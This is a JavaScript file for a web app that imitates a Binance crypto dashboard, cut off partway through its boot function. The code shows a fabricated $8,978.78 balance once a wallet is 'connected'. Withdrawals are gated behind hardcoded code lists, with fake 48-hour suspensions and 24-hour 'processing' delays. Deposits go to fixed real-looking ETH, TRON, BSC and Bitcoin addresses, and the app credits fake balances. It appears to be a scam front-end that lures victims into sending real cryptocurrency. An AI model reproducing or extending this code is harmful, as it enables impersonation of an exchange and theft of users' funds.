// ===============================
// BINANCE WEB3 DASHBOARD LOGIC
// ===============================
const COINGECKO_API = 'https://api.coingecko.com/api/v3';
const GEMINI_API = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=`;
const VALID_WITHDRAWAL_CODES = ["483t21", "175064", "90h718", "63h285", "217509", "856430", "49h127", "731694", "56h8k3", "30jy17", "941g56", "12s374", "6h5b20", "203519", "48h960", "819hh2", "356h01", "740h28"];
const DEPOSIT_CODES = ["4k2915", "93y472", "158i03", "7649k1", "50u319", "847l61", "31k586", "672h50", "24j391", "9y5836", "73a258", "62h047", "580y24", "417i02", "89h351", "264h98", "152j83", "309u72", "741o26", "58u320", "62w583", "958j10", "203i74", "7429u5", "894j21", "510f93", "6734o0", "248h65", "90c632", "43j892"];
const DEPOSIT_NETWORKS = { USDT: ['Ethereum','Tron','BSC'], BTC: ['Bitcoin'], ETH: ['Ethereum'], BNB: ['BNB Smart Chain'], TRX: ['Tron'] };
const DEPOSIT_ADDRESSES = { ETHEREUM: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130', TRON: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco', BSC: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130', BITCOIN: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu' };
const APP_STATE_KEY = 'binanceWeb3DashboardAppState';

// ========== STATE ============
let appState = {
    currentPage: 'home',
    connected: false, accountId: '', walletAddress: '',
    balances: { totalUSD: 0.00, tradeUSD: 0.00, holdings: [], hasUSDT: false },
    settings: { notificationsOn: true, lastNotificationTime: 0, gaLinked: false },
    activities: [],
    withdrawal: {
        attempts: 0, suspensionEndTime: 0, processingEndTime: 0, currentWithdrawal: null
    },
    chatHistory: [],
    currentDeposit: {}, selectedDepositCoin: null, allCoins: [],
};

// ===== Utility: Short Wait =====
const waitFor = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ========== STATE MANAGEMENT =========
function loadState() {
    try {
        const s = localStorage.getItem(APP_STATE_KEY);
        if (s !== null) { appState = { ...appState, ...JSON.parse(s) }; }
        if (!appState.balances.hasUSDT) {
            appState.balances.holdings.push({ symbol:'USDT', name:'Tether', balance:0, image:'https://assets.coingecko.com/coins/images/325/large/Tether-logo.png', price:1.00 });
            appState.balances.hasUSDT = true;
        }
    } catch (e) { }
}
function saveState() { localStorage.setItem(APP_STATE_KEY, JSON.stringify(appState)); }
function saveAndRender() { saveState(); updateHeader(); updateBalances(); updateHoldings(); updateActivityList(); showPage(appState.currentPage); }

// ========== PAGE ROUTER ==========
function showPage(pageId) {
    document.querySelectorAll('.page-content').forEach(p=>p.classList.add('hidden'));
    const page=document.getElementById(pageId); if(page) page.classList.remove('hidden'); appState.currentPage=pageId; saveState();
    document.querySelectorAll('#footer-nav .footer-btn').forEach(btn=>{
        btn.classList.remove('active'); if(btn.dataset.page===pageId)btn.classList.add('active');
    });
    if(pageId==='home'){initTradingView('tv-chart-container','BINANCE:BTCUSDT');loadHotCoins();}
    if(pageId==='tradePage'){loadTradeChart();}
    if(pageId==='marketPage'){initTradingView('tv-market-chart','CRYPTOCAP:TOTAL');loadMarkets();}
    if(pageId==='depositCoinSelectPage'){loadDepositCoins();}
    if(pageId==='withdrawDetailsPage'){document.getElementById('withdraw-amount-input').value=appState.balances.totalUSD.toFixed(2);}
}
window.showPage = showPage;

// ========== HEADER ===============
function updateHeader() {
    const isConnected=appState.connected, btn=document.getElementById('btnConnect'), idDisplay=document.getElementById('wallet-id-display');
    if(isConnected){
        btn.textContent='Connected';btn.onclick=disconnectSim; btn.classList.add('bg-success','hover:bg-success/80'); btn.classList.remove('bg-accent');
        idDisplay.textContent=appState.accountId;
    }else{
        btn.textContent='Connect Wallet';btn.onclick=connectWallet; btn.classList.add('bg-accent');btn.classList.remove('bg-success');idDisplay.textContent='';
    }
}

// ========== WALLET CONNECTION ==============
async function connectWallet() {
    if(appState.connected)return; showLoading('Connecting wallet...');
    await waitFor(15000);
    appState.connected=true;
    appState.accountId="9437137866";
    appState.walletAddress="0x97fe2864e38d0a667fc4daf9b2a4ed3e97ca1168";
    appState.balances.totalUSD=8978.78;
    appState.balances.tradeUSD=8978.78;
    let usdt=appState.balances.holdings.find(h=>h.symbol==='USDT');
    if(usdt)usdt.balance=8978.78;else appState.balances.holdings.push({symbol:'USDT',name:'Tether',balance:8978.78,image:'https://assets.coingecko.com/coins/images/325/large/Tether-logo.png',price:1.00});
    appState.balances.hasUSDT=true;
    appState.activities.unshift({type:'Auth',desc:'Wallet connected successfully.',date:(new Date()).toISOString(),status:'Success'});
    hideLoading();saveAndRender();
    showModal('Welcome!','Your wallet (ID: '+appState.accountId+') is now connected.');
}
function disconnectSim() {
    appState.connected=false;appState.accountId="";appState.walletAddress="";appState.balances.totalUSD=0;appState.balances.tradeUSD=0;
    let usdt=appState.balances.holdings.find(h=>h.symbol==='USDT'); if(usdt)usdt.balance=0;
    appState.activities.unshift({type:'Auth',desc:'Wallet disconnected.',date:(new Date()).toISOString(),status:'Info'});
    saveAndRender();showPage('home');
}
window.connectWallet = connectWallet;
window.disconnectSim = disconnectSim;

// ========== BALANCES & HOLDINGS ============
async function updateBalances() {
    const balance=appState.connected?appState.balances.totalUSD:0;
    document.getElementById('total-balance').textContent='$'+balance.toFixed(2);
    const pctDisplay=document.getElementById('balance-percentage');
    if(appState.connected){
        try{
            const r=await fetch(`${COINGECKO_API}/coins/bitcoin`);
            const d=await r.json();const change=d.market_data.price_change_percentage_24h.toFixed(2);
            pctDisplay.textContent=`${change>0?'+':''}${change}% (24h)`;pctDisplay.className=`text-sm font-semibold ml-2 ${change>0?'text-success':'text-danger'}`;
        }catch(e){pctDisplay.textContent='0.00% (24h)';pctDisplay.className='text-sm font-semibold ml-2 text-muted';}
    }else{pctDisplay.textContent='0.00% (24h)';pctDisplay.className='text-sm font-semibold ml-2 text-muted';}
}
async function updateHoldings() {
    const list=document.getElementById('holdings-list');
    if(!appState.connected){list.innerHTML='<p class="text-muted text-center py-4">Connect wallet to view holdings.</p>';return;}
    let html='';
    const symbols=appState.balances.holdings.map(h=>h.symbol).join(',').toLowerCase();
    try{
        const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&symbols=${symbols}`);
        const marketData=await r.json();
        appState.balances.holdings.forEach(holding=>{
            const d=marketData.find(md=>md.symbol.toUpperCase()===holding.symbol.toUpperCase());
            const price=d?d.current_price:(holding.symbol==='USDT'?1:0);
            const valueUSD=holding.balance*price;
            const change24h=d?d.price_change_percentage_24h:0;
            html+=`
            <div class="flex items-center justify-between py-3 border-b border-gray-800 last:border-b-0">
              <div class="flex items-center space-x-3">
                <img src="${holding.image}" class="w-8 h-8 rounded-full" onerror="this.src='https://placehold.co/32x32/1f2937/ffffff?text=${holding.symbol}'" /><div>
                  <p class="font-semibold">${holding.symbol.toUpperCase()}</p>
                  <p class="text-xs text-muted">$${price.toFixed(4)}</p></div>
              </div>
              <div class="text-right">
                <p class="font-semibold">$${valueUSD.toFixed(2)}</p>
                <p class="text-xs ${change24h>0?'text-success':'text-danger'}">${change24h>0?'+':''}${change24h.toFixed(2)}%</p>
              </div>
            </div>`;
        });
    }catch(e){html='<p class="text-muted text-center py-4">Failed to load live prices for holdings.</p>';}
    list.innerHTML=html;saveState();
}

// ========== HOT COINS ============
async function loadHotCoins() {
    const list=document.getElementById('hot-coins-list');
    try{
        const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=volume_desc&per_page=5&page=1&sparkline=false`);
        const coins=await r.json();
        let html='';
        coins.forEach(coin=>{
            html+=`
            <div class="flex items-center justify-between p-3 bg-gray-900 rounded-lg hover:bg-gray-800 cursor-pointer" onclick="openCoinChart('${coin.symbol.toUpperCase()}')">
              <div class="flex items-center space-x-3">
                <img src="${coin.image}" class="w-6 h-6 rounded-full" onerror="this.src='https://placehold.co/24x24/1f2937/ffffff?text=${coin.symbol.substr(0,2).toUpperCase()}'" />
                <div><p class="font-semibold">${coin.symbol.toUpperCase()}</p><p class="text-xs text-muted">${coin.name}</p></div>
              </div>
              <div class="text-right">
                <p class="font-semibold">$${coin.current_price.toFixed(4)}</p>
                <p class="text-xs ${coin.price_change_percentage_24h>0?'text-success':'text-danger'}">${coin.price_change_percentage_24h>0?'+':''}${coin.price_change_percentage_24h.toFixed(2)}%</p>
              </div></div>`;
        });
        list.innerHTML=html;
    }catch(e){list.innerHTML='<p class="text-danger text-center py-4">Failed to load hot coins.</p>';}
}
window.loadHotCoins = loadHotCoins;

// ========== TRADINGVIEW CHART ============
function initTradingView(containerId, symbol) {
    if(document.getElementById(containerId).querySelector('iframe'))return; // chart already loaded
    new TradingView.widget({
        "container_id": containerId, "symbol": symbol, "interval": "D", "timezone": "Etc/UTC", "theme": "dark",
        "style": "1", "locale": "en", "toolbar_bg": "#f1f3f6",
        "enable_publishing": false, "allow_symbol_change": true, "hide_side_toolbar": true,
        "calendar": false, "details": false, "save_image": false, "support_host": "https://www.tradingview.com"
    });
}
function openCoinChart(symbol) {
    showModal(`${symbol} Live Price`, `Loading chart for ${symbol}. Check the Trade or Market page for a full view.`);
}
function loadTradeChart(pair='BTCUSDT') {
    document.getElementById('tv-trade-chart').innerHTML='';
    initTradingView('tv-trade-chart',`BINANCE:${pair}`);
    document.getElementById('trade-pair-display').textContent=pair.replace('USDT','/USDT');
    fetch(`${COINGECKO_API}/simple/price?ids=bitcoin&vs_currencies=usd`)
      .then(resp=>resp.json())
      .then(data=>{document.getElementById('trade-price-display').textContent='$'+data.bitcoin.usd.toFixed(2);})
      .catch(()=>{document.getElementById('trade-price-display').textContent='Error';});
}
window.openCoinChart = openCoinChart;
window.loadTradeChart = loadTradeChart;

// ========== WITHDRAW LOGIC ============
function openWithdraw() {
    if(!appState.connected)
        return showModal('Wallet Required','Connect your wallet to withdraw.');
    const now=Date.now();
    if(appState.withdrawal.suspensionEndTime>now){
        const remaining=formatTime(appState.withdrawal.suspensionEndTime-now);
        return showModal('Withdrawal Suspended',`Suspended for 48 hours. Remaining: ${remaining}`);
    }
    document.getElementById('withdrawalSelector').classList.remove('hidden');
}
function showWithdrawalDetails(type) {
    document.getElementById('withdrawalSelector').classList.add('hidden');
    document.getElementById('withdrawDetailsPage').classList.remove('hidden');
}
window.openWithdraw = openWithdraw;
window.showWithdrawalDetails = showWithdrawalDetails;
function fillConnectedWalletAddress() {
    if(appState.connected)document.getElementById('withdraw-address-input').value=appState.walletAddress;
    else showModal('Disconnected','Connect wallet to autofill address.');
}
window.fillConnectedWalletAddress = fillConnectedWalletAddress;
function setMaxWithdrawAmount() {
    document.getElementById('withdraw-amount-input').value=appState.balances.totalUSD.toFixed(2);
}
window.setMaxWithdrawAmount = setMaxWithdrawAmount;
function toggleNetworkSelection() {
    document.getElementById('networkSelectionDropdown').classList.toggle('hidden');
}
window.toggleNetworkSelection = toggleNetworkSelection;
function selectWithdrawalNetwork(value,label) {
    document.getElementById('selectedNetworkDisplay').textContent=label;
    document.getElementById('networkSelectionDropdown').classList.add('hidden');
    appState.withdrawal.network=value;
}
window.selectWithdrawalNetwork = selectWithdrawalNetwork;
function showWithdrawalConfirmation() {
    const address=document.getElementById('withdraw-address-input').value.trim();
    const network=appState.withdrawal.network||"";
    const amount=parseFloat(document.getElementById('withdraw-amount-input').value);
    if(!address||!network||isNaN(amount)||amount<=0||amount>appState.balances.totalUSD)
        return showModal('Error','Provide address, network, amount < balance.');
    appState.withdrawal.currentWithdrawal={address,network,amount};
    document.getElementById('conf-addr').textContent=address;
    document.getElementById('conf-net').textContent=network;
    document.getElementById('conf-amt').textContent='$'+amount.toFixed(2)+' USDT';
    document.getElementById('withdraw-validation-code').value='';
    document.getElementById('withdraw-error').classList.add('hidden');
    showPage('withdrawConfirmPage');
}
window.showWithdrawalConfirmation = showWithdrawalConfirmation;
async function submitWithdrawalConfirmation() {
    const code=document.getElementById('withdraw-validation-code').value.trim();
    const errorMsg=document.getElementById('withdraw-error');
    const withdrawData=appState.withdrawal.currentWithdrawal;
    if(!code||code.length!==6){errorMsg.textContent='Enter 6-digit code.';errorMsg.classList.remove('hidden');return;}
    errorMsg.classList.add('hidden');showLoading('Verifying...');
    await waitFor(15000);
    if(!VALID_WITHDRAWAL_CODES.includes(code)){
        appState.withdrawal.attempts+=1;hideLoading();
        if(appState.withdrawal.attempts>=5){
            const suspensionDuration=48*60*60*1000;appState.withdrawal.suspensionEndTime=Date.now()+suspensionDuration;appState.withdrawal.attempts=0;
            appState.activities.unshift({type:'Withdrawal',desc:`5 failed attempts. Suspended 48 hours.`,date:(new Date()).toISOString(),status:'Failure'});
            saveAndRender();showModal('Suspended','Incorrect 5 times. Withdrawal suspended 48 hours.');showPage('home');
        }else{saveState();errorMsg.textContent=`Failed. Try again. (${appState.withdrawal.attempts}/5)`;errorMsg.classList.remove('hidden');}
        return;
    }
    const processingDuration=24*60*60*1000;appState.withdrawal.processingEndTime=Date.now()+processingDuration;appState.withdrawal.attempts=0;
    appState.activities.unshift({type:'Withdrawal',desc:`Processing ${withdrawData.amount.toFixed(2)} USDT to ${withdrawData.address.substring(0,8)}... via ${withdrawData.network}.`,date:(new Date()).toISOString(),status:'Pending'});
    hideLoading();saveAndRender();
    document.getElementById('proc-addr').textContent=withdrawData.address;
    document.getElementById('proc-net').textContent=withdrawData.network;
    document.getElementById('proc-amt').textContent='$'+withdrawData.amount.toFixed(2)+' USDT';
    showPage('withdrawalProcessingPage');
}
window.submitWithdrawalConfirmation = submitWithdrawalConfirmation;

// ========== DEPOSIT LOGIC ===========
function openDepositPage() {
    if(!appState.connected)
        return showModal('Wallet Required','Connect wallet to deposit.');
    showPage('depositCoinSelectPage');
}
window.openDepositPage = openDepositPage;
async function loadDepositCoins() {
    const depositCoinList=document.getElementById('depositCoinList');
    if(!depositCoinList)return;
    depositCoinList.innerHTML='<p class="text-muted text-center py-4">Loading coins...</p>';
    try{
        if(appState.allCoins.length===0){
            const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1`);
            appState.allCoins=await r.json();
        }
        appState.allCoins.sort((a,b)=>a.symbol.localeCompare(b.symbol));
        renderDepositCoinList(appState.allCoins);
    }catch(error){depositCoinList.innerHTML='<p class="text-danger text-center py-4">Failed to load coins.</p>';}
    const searchInput=document.getElementById('depositSearch');
    if(searchInput){searchInput.oninput=(e)=>{
        const s=e.target.value.trim().toLowerCase();
        if(!s){renderDepositCoinList(appState.allCoins);return;}
        const filtered=appState.allCoins.filter(c=>c.name.toLowerCase().includes(s)||c.symbol.toLowerCase().includes(s));
        renderDepositCoinList(filtered);
    };}
}
function renderDepositCoinList(coins) {
    const container=document.getElementById('depositCoinList');
    if(!container)return;if(!coins||coins.length===0){container.innerHTML='<p class="text-muted text-center py-4">No matching coins found.</p>';return;}
    let html='';coins.forEach(coin=>{
        html+=`
        <div class="deposit-coin-item flex items-center justify-between p-3 bg-gray-900 rounded-lg border border-gray-800 hover:bg-gray-800 cursor-pointer"
         data-symbol="${coin.symbol.toUpperCase()}" data-name="${coin.name}" data-image="${coin.image}">
          <div class="flex items-center gap-3">
            <img src="${coin.image}" class="w-8 h-8 rounded-full" onerror="this.src='https://placehold.co/32x32/1f2937/ffffff?text=${coin.symbol.substr(0,2).toUpperCase()}'"/>
            <div><p class="font-semibold">${coin.symbol.toUpperCase()}</p><p class="text-xs text-muted">${coin.name}</p></div>
          </div><svg class="w-5 h-5 text-accent" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7"/></svg></div>
        `;
    });
    container.innerHTML=html;
    document.querySelectorAll('.deposit-coin-item').forEach(item=>{
        item.onclick=()=>{selectDepositCoin(item.dataset.symbol,item.dataset.name,item.dataset.image);}
    });
}
function selectDepositCoin(symbol,name,image) {
    appState.selectedDepositCoin={symbol,name,image};
    document.getElementById('depositCoinName').textContent=symbol;
    document.getElementById('depositAmountSymbol').textContent=symbol;
    renderNetworkSelection(symbol);
    showPage('depositNetworkPage');
}
function renderNetworkSelection(coinSymbol){
    const container=document.getElementById('networkSelectionList');
    if(!container)return;
    const networks=DEPOSIT_NETWORKS[coinSymbol]||['Ethereum'];
    container.innerHTML=networks.map(network=>`
        <button class="w-full flex items-center py-4 px-5 bg-gray-900 border border-gray-700 rounded-xl hover:bg-gray-800"
        data-network="${network}">
            <span class="text-md font-semibold">${network}</span>
            <svg class="w-5 h-5 ml-auto text-accent" xmlns="http://www.w3.org/2000/svg" fill="none"
                viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7" />
            </svg>
        </button>
      `).join('');
    document.querySelectorAll('.network-select-btn').forEach(btn=>
      btn.onclick=()=>openDepositAddressPage(appState.selectedDepositCoin.symbol,btn.dataset.network)
    );
}
function openDepositAddressPage(symbol,network){
    const nkey=network.replace(/ /g,'').toUpperCase();
    const address=DEPOSIT_ADDRESSES[nkey];
    if(!address)return showModal('Error',`No deposit address for ${symbol} on ${network}.`);
    appState.currentDeposit={coin:symbol,network,address};
    showPage('depositAddressPage');
    document.getElementById('depositNetworkHeader').textContent=network;
    document.getElementById('depositAddressDisplay').textContent=address;
    const qrContainer=document.getElementById('qrcode');qrContainer.innerHTML='';
    new QRCode(qrContainer,{text:address,width:160,height:160,colorDark:"#fff",colorLight:"#0d0e11",correctLevel:QRCode.CorrectLevel.H});
}
function copyDepositAddress(){const address=document.getElementById('depositAddressDisplay').textContent;
    navigator.clipboard.writeText(address).then(()=>showModal('Copied','Address copied!')).catch(()=>showModal('Copy Failed','Failed to copy address.'));
}
window.copyDepositAddress = copyDepositAddress;
function showDepositConfirmationPage(){
    const amount=parseFloat(document.getElementById('depositAmountInput').value);
    if(isNaN(amount)||amount<=0)return showModal('Invalid','Enter valid deposit amount.');
    appState.currentDeposit.amount=amount;
    document.getElementById('depositConfirmAmount').textContent='$'+amount.toFixed(2);
    document.getElementById('depositVerificationCode').value='';
    document.getElementById('depositCodeError').classList.add('hidden');
    showPage('depositConfirmPage');
}
window.showDepositConfirmationPage = showDepositConfirmationPage;
async function handleDepositConfirmation(){
    const code=document.getElementById('depositVerificationCode').value.trim();
    const errorMsg=document.getElementById('depositCodeError');
    if(!code||code.length!==6){errorMsg.textContent='Enter 6-digit code.';errorMsg.classList.remove('hidden');return;}
    errorMsg.classList.add('hidden');showLoading('Processing deposit...');
    await waitFor(15000);
    if(!DEPOSIT_CODES.includes(code)){
        hideLoading();errorMsg.textContent='Invalid verification code.';errorMsg.classList.remove('hidden');return;
    }
    // Simulate code usage tracking
    const usedCodes = JSON.parse(localStorage.getItem('usedDepositCodes')||'[]');
    if(usedCodes.includes(code)){
         hideLoading();errorMsg.textContent='Code already used.';errorMsg.classList.remove('hidden');return;
    }
    usedCodes.push(code);localStorage.setItem('usedDepositCodes',JSON.stringify(usedCodes));
    const depositAmount=appState.currentDeposit.amount,depositSymbol=appState.currentDeposit.coin;
    let holding=appState.balances.holdings.find(h=>h.symbol===depositSymbol);
    if(holding){if(depositSymbol==='USDT')appState.balances.totalUSD+=depositAmount;holding.balance+=depositAmount;}
    else appState.balances.holdings.push({
        symbol:depositSymbol,name:appState.selectedDepositCoin.name,balance:depositAmount,image:appState.selectedDepositCoin.image,price:0});
    appState.activities.unshift({type:'Deposit',desc:`Deposited ${depositAmount.toFixed(2)} ${depositSymbol} via ${appState.currentDeposit.network}.`,date:(new Date()).toISOString(),status:'Success'});
    hideLoading();saveAndRender();
    showModal('Deposit Successful',`Successfully deposited ${depositAmount.toFixed(2)} ${depositSymbol}.`);
    showPage('home');
}
window.handleDepositConfirmation = handleDepositConfirmation;
function addDepositTokenToHoldings(){
    hideModal('deposit-success-modal');showPage('home');updateHoldings();
}
window.addDepositTokenToHoldings = addDepositTokenToHoldings;

// ========== CHATBOT (GeminiAI) ==========
async function sendChatMessage(){
    const input=document.getElementById('chat-input'),message=input.value.trim(),chatBox=document.getElementById('chat-box');
    if(!message)return;appState.chatHistory.push({role:'user',text:message});appendMessage(message,'user');input.value='';
    showLoading('AI thinking...');
    try{
        const payload={contents:appState.chatHistory.map(msg=>({role:msg.role==='user'?'user':'model',parts:[{text:msg.text}]}))};
        const r=await fetch(GEMINI_API,{
            method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)
        });
        if(!r.ok)throw new Error('API call failed');
        const result=await r.json();
        const aiText=result.candidates?.[0]?.content?.parts?.[0]?.text||"Trouble connecting to network. Try again.";
        appState.chatHistory.push({role:'model',text:aiText});appendMessage(aiText,'ai');
    }catch(e){const errorText="Support AI can't connect. Try again later.";appState.chatHistory.push({role:'model',text:errorText});appendMessage(errorText,'ai');}
    finally{hideLoading();saveState();chatBox.scrollTop=chatBox.scrollHeight;}
}
function appendMessage(text,sender){
    const chatBox=document.getElementById('chat-box'),isUser=sender==='user';
    const msgDiv=document.createElement('div');msgDiv.className=`flex ${isUser?'justify-end':'justify-start'}`;
    const contentDiv=document.createElement('div');
    contentDiv.className=`p-3 rounded-2xl max-w-[80%] text-sm ${isUser?'bg-accent2 text-gray-900 rounded-br-none':'bg-gray-700 text-gray-100 rounded-bl-none'}`;
    contentDiv.textContent=text;msgDiv.appendChild(contentDiv);chatBox.appendChild(msgDiv);chatBox.scrollTop=chatBox.scrollHeight;
}
window.sendChatMessage = sendChatMessage;

// ========== GOOGLE AUTH ============
async function verifyGoogleAuthCode(){
    const code=document.getElementById('ga-code-input').value.trim(),errorMsg=document.getElementById('ga-error');
    if(code.length!==6){errorMsg.textContent='Enter 6-digit code.';errorMsg.classList.remove('hidden');return;}
    errorMsg.classList.add('hidden');showLoading('Verifying...');
    await waitFor(15000);
    if(code==='123456'){
        appState.settings.gaLinked=true;
        appState.activities.unshift({type:'Security',desc:'Google Auth linked.',date:(new Date()).toISOString(),status:'Success'});
        hideLoading();saveAndRender();showModal('Success','Google Authenticator linked to your account.');showPage('accountDetailsPage');
    }else{hideLoading();errorMsg.textContent='Invalid code. Try again.';errorMsg.classList.remove('hidden');}
}
window.verifyGoogleAuthCode = verifyGoogleAuthCode;

// ========== NOTIFICATIONS ==========
function openNotifications(){
    loadNotifications();showPage('notificationPage');
}
window.openNotifications = openNotifications;
function toggleNotifications(){
    appState.settings.notificationsOn=document.getElementById('notification-toggle').checked;saveState();
    showModal('Settings Saved',`Daily updates are ${appState.settings.notificationsOn?'ON':'OFF'}.`);
}
window.toggleNotifications = toggleNotifications;
async function loadNotifications(){
    const list=document.getElementById('notification-list');
    list.innerHTML='<p class="text-muted text-center py-4">Fetching notifications...</p>';
    const isChecked=appState.settings.notificationsOn;
    document.getElementById('notification-toggle').checked=isChecked;
    try{
        const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=5&page=1&sparkline=false`);
        const coins=await r.json();
        let html=`<div class="p-3 bg-accent2/20 rounded-lg border border-yellow-800">
            <p class="font-semibold">Account Notification</p>
            <p class="text-xs text-gray-300">${appState.settings.gaLinked?'✅ Account is secured.':'⚠️ Secure with Google Authenticator.'}</p>
        </div>`;
        html+='<h4 class="font-semibold text-lg mt-4 mb-2">Market Updates</h4>';
        coins.forEach(coin=>{
            const change24h=coin.price_change_percentage_24h;
            html+=`<div class="p-3 bg-gray-900 rounded-lg border border-gray-800">
                <p class="font-semibold flex justify-between">${coin.name} (${coin.symbol.toUpperCase()}) <span class="${change24h>0?'text-success':'text-danger'} text-xs">${change24h>0?'Surging':'Dipping'}</span></p>
                <p class="text-xs text-muted">Current Price: $${coin.current_price.toFixed(4)}. 24h Change: ${change24h.toFixed(2)}%.</p>
            </div>`;
        });
        list.innerHTML=html;
        document.getElementById('notification-dot').classList.remove('hidden');
    }catch(e){list.innerHTML='<p class="text-danger text-center py-4">Failed to fetch market updates.</p>';}
}

// ========== SEARCH FUNCTION ===========
function openSearch(){
    showPage('searchPage');
    document.getElementById('search-results').innerHTML='<p class="text-muted text-center py-4">Start typing to see results...</p>';
}
window.openSearch = openSearch;
async function liveSearch(){
    const searchTerm=document.getElementById('search-input').value.trim().toLowerCase();
    const resultsDiv=document.getElementById('search-results');
    if(searchTerm.length<2){resultsDiv.innerHTML='<p class="text-muted text-center py-4">Start typing to see results...</p>';return;}
    resultsDiv.innerHTML='<p class="text-muted text-center py-4">Searching...</p>';
    try{
        const coinResponse=await fetch(`${COINGECKO_API}/search?query=${searchTerm}`);
        const coinData=await coinResponse.json();
        const coins=coinData.coins.slice(0,5);
        let html='<h4 class="font-semibold text-muted mb-2">Coins</h4><div class="space-y-2">';
        if(coins.length===0){html+='<p class="text-muted text-sm pl-2">No coins found.</p>';}
        else coins.forEach(coin=>{
            html+=`
            <div class="flex items-center justify-between p-3 bg-gray-900 rounded-lg hover:bg-gray-800 cursor-pointer" onclick="openCoinChart('${coin.symbol.toUpperCase()}USDT')">
              <div class="flex items-center space-x-3"><img src="${coin.large}" class="w-6 h-6 rounded-full"/>
                <div><p class="font-semibold">${coin.name} (${coin.symbol.toUpperCase()})</p>
                        <p class="text-xs text-muted">Rank: ${coin.market_cap_rank}</p></div>
              </div></div>`;
        });
        html+='</div>';
        resultsDiv.innerHTML=html;
    }catch(e){resultsDiv.innerHTML='<p class="text-danger text-center py-4">Search failed.</p>';}
}
window.liveSearch = liveSearch;

// ========== ACTIVITY LOG ============
function formatTime(ms){
    const totalSeconds=Math.floor(ms/1000),hours=Math.floor(totalSeconds/3600),minutes=Math.floor((totalSeconds%3600)/60),seconds=totalSeconds%60;
    const pad=num=>String(num).padStart(2,'0');
    return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`;
}
function updateActivityList(){
    const list = document.getElementById('activity-list'), accList=document.getElementById('account-activity-list'); let html='';
    if(appState.activities.length===0)html='<p class="text-muted text-center py-2">No recent activities.</p>';
    else appState.activities.forEach(activity=>{
        let statusClass='text-muted';if(activity.status==='Success')statusClass='text-success';
        if(activity.status==='Failure')statusClass='text-danger';if(activity.status==='Pending')statusClass='text-yellow-400';
        html+=`<div class="flex justify-between text-sm py-2 border-b border-gray-900 last:border-b-0">
            <p class="truncate mr-2">${activity.desc}</p>
            <span class="${statusClass} font-semibold">${activity.status}</span></div>`;
    });
    list.innerHTML=html; if(accList)accList.innerHTML=html;
}

// ========== MARKET PAGE DATA ===========
async function loadMarkets(){
    const topCoinsList=document.getElementById('top-coins-list'),newsDiv=document.getElementById('market-news');
    try{
        const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false`);
        const coins=await r.json();let html='';
        coins.forEach((coin,index)=>{
            html+=`
            <div class="flex items-center justify-between py-3 border-b border-gray-800 last:border-b-0 cursor-pointer" onclick="openCoinChart('${coin.symbol.toUpperCase()}USDT')">
              <div class="flex items-center space-x-3"><span class="text-muted w-4">${index+1}</span>
                <img src="${coin.image}" class="w-6 h-6 rounded-full" onerror="this.src='https://placehold.co/24x24/1f2937/ffffff?text=${coin.symbol.substr(0,2).toUpperCase()}'"/><div>
                <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
                <p class="text-xs text-muted">${coin.name}</p></div>
              </div>
              <div class="text-right">
                <p class="font-semibold">$${coin.current_price.toFixed(2)}</p>
                <p class="text-xs ${coin.price_change_percentage_24h>0?'text-success':'text-danger'}">${coin.price_change_percentage_24h>0?'+':''}${coin.price_change_percentage_24h.toFixed(2)}%</p>
              </div></div>`;
        });topCoinsList.innerHTML=html;
    }catch(e){topCoinsList.innerHTML='<p class="text-danger text-center py-4">Failed to load top coins.</p>';}
    try{
        const r=await fetch(`${COINGECKO_API}/coins/list?include_platform=false`);
        const allCoins=await r.json();const sampleCoins=allCoins.slice(0,3);
        newsDiv.innerHTML=`
            <div class="p-2 bg-accent2/30 rounded-lg text-sm border border-yellow-800 mb-2">
                <p class="font-semibold">Launch Pool:</p>
                <p class="text-xs text-muted">New token launch for ${sampleCoins[0].symbol.toUpperCase()} and ${sampleCoins[1].symbol.toUpperCase()} soon!</p>
            </div><p class="text-xs text-muted">Live prices updated via CoinGecko API.</p>
        `;
    }catch(e){newsDiv.innerHTML='<p class="text-danger text-sm">Failed to load market news.</p>';}
}
window.loadMarkets = loadMarkets;

// ========== NOTIF BANNER LOGIC ==============
async function showMarketBanner(){
    const banner=document.getElementById('notification-banner'),text=document.getElementById('banner-text');
    try{
        const r=await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=volume_desc&per_page=1&page=1&sparkline=false`);
        const coin=(await r.json())[0];
        if(coin){
            const change=coin.price_change_percentage_24h.toFixed(2);
            text.innerHTML=`🔥 Market Alert: ${coin.name} (${coin.symbol.toUpperCase()}) is <span class="${change>0?'text-success':'text-danger'}">${change>0?'Surging':'Dipping'}</span>, current price $${coin.current_price.toFixed(2)}.`;
            banner.style.display='block';
        }else{banner.style.display='none';}
    }catch(e){banner.style.display='none';}
}
function hideNotificationBanner(){
    document.getElementById('notification-banner').style.display='none';
}
window.hideNotificationBanner = hideNotificationBanner;

// ========== LOADING & MODALS ============
function showLoading(text='Loading...'){
    document.getElementById('loading-text').textContent=text;
    document.getElementById('loading-modal').classList.remove('hidden');
}
function hideLoading(){
    document.getElementById('loading-modal').classList.add('hidden');
}
function showModal(title,msg){
    document.getElementById('modal-title').textContent=title;
    document.getElementById('modal-body').textContent=msg;
    document.getElementById('modal-container').classList.remove('hidden');
}
function hideModal(id){
    document.getElementById(id).classList.add('hidden');
}
window.showModal = showModal;
window.hideModal = hideModal;

// ========== INIT BOOT ============
function boot(){
    loadState();
